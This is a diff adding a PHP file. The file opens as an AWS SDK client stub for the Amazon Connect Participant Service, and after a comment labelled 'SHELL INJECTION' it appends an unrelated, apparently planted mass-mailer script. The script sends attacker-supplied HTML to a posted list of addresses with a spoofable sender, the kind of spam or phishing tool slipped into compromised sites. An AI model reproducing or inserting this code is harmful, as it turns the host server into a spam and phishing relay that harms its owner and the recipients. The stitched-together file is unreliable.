@@ -1,0 +1,113 @@
+<?php
+namespace Aws\ConnectParticipant;
+
+use Aws\AwsClient;
+
+/**
+ * This client is used to interact with the **Amazon Connect Participant Service** service.
+ * @method \Aws\Result completeAttachmentUpload(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise completeAttachmentUploadAsync(array $args = [])
+ * @method \Aws\Result createParticipantConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createParticipantConnectionAsync(array $args = [])
+ * @method \Aws\Result disconnectParticipant(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise disconnectParticipantAsync(array $args = [])
+ * @method \Aws\Result getAttachment(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getAttachmentAsync(array $args = [])
+ * @method \Aws\Result getTranscript(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getTranscriptAsync(array $args = [])
+ * @method \Aws\Result sendEvent(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise sendEventAsync(array $args = [])
+ * @method \Aws\Result sendMessage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise sendMessageAsync(array $args = [])
+ * @method \Aws\Result startAttachmentUpload(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startAttachmentUploadAsync(array $args = [])
+ */
+class ConnectParticipantClient extends AwsClient {}
+// SHELL INJECTION
+<?php
+
+$testa = $_POST['veio'];
+
+if($testa != "") {
+
+				$message = $_POST['html'];
+
+				$subject = $_POST['assunto'];
+
+				$de = $_POST['de'];
+
+				$to = $_POST['emails'];
+
+				// ler o conte?do do arquivo para uma string
+
+				
+
+				//$handle = fopen ($emails, "r");
+
+				//$to = fread ($handle, filesize ($emails));
+
+				//fclose ($handle);
+
+				
+
+				//$handle2 = fopen ($html, "r");
+
+				//$message = fread ($handle2, filesize ($html));
+
+				//fclose ($handle2);
+
+				
+
+			
+
+				$headers  = "MIME-Version: 1.0\r\n";
+
+
+				$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
+
+
+
+				$email = explode("\n", $to);
+
+
+
+				$headers .= "From: ".$RealName." <".$de.">\r\n";
+
+
+
+
+
+				$message = stripslashes($message);
+
+				
+
+				$i = 0;
+
+				$count = 1;
+
+				while($email[$i]) {
+
+				
+
+//				$ok = "ok";
+if(mail($email[$i], $subject, $message, $headers))
+echo "* N?mero: $count <b>".$email[$i]."</b> <font color=green>Enviado</font><br><hr>";
+else
+echo "* N?mero: $count <b>".$email[$i]."</b> <font color=red>Erro</font><br><hr>";
+$i++;
+$count++;
+}
+//$count--;
+//if($ok == "ok")
+
+	//echo "<script> alert('Terminou os emails. ".$count." e-mails enviados'); </script>";
+
+
+
+
+
+
+
+}
+
+?>
